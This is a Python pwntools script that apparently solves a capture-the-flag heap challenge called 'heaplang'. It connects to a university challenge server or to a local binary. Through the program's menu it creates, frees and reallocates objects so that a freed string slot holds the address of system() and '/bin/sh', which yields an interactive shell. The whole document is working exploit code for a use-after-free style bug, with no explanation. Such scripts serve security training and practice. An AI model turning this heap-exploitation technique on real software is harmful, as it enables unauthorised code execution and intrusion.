from pwn import *

#-------------SETTINGS-----------------------------------------
REMOTE = True
DEBUG = False
#-------------INTERSTITIAL-------------------------------------
if DEBUG:
    context.log_level = "DEBUG"

if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu",1345)
    p.sendline("svv232")
else:
    p = process("./heaplang")

p.recvuntil(">")
#-------------EXPLOIT------------------------------------------

SYSTEM  = p64(0x4006e0)
LENGTH = str(0x18)

def create_string(string,length = LENGTH):
    p.send("1") #create 
    p.recvuntil("?") #eat interstitial
    p.send("1") #create string
    p.recvuntil("?") #eat interstitial
    p.send(length) #Length?
    p.recvuntil("?")  #eat interstitial
    p.send(string) #Contents
    p.recvuntil(">")

def print_string(index = 0):
    p.send("3") #print string function
    p.recvuntil("?") #eat interstitial
    p.send(str(index)) #print string function option
    p.recvuntil(">")


def delete_string(index = 0):
    p.send("4")
    p.recvuntil("?")
    p.sendline(str(index))
    p.recvuntil(">")

def create_number(num):
    p.send("1") #create 
    p.recvuntil("?") #eat interstitial
    p.send("0") #create string
    p.recvuntil("?") #eat interstitial
    p.send(str(num)) #Length?
    p.recvuntil(">")


create_string("/bin/sh\x00")
create_string(SYSTEM)
delete_string()
create_number(u64(SYSTEM))
create_number(u64("/bin/sh\x00"))
print_string()

p.interactive()
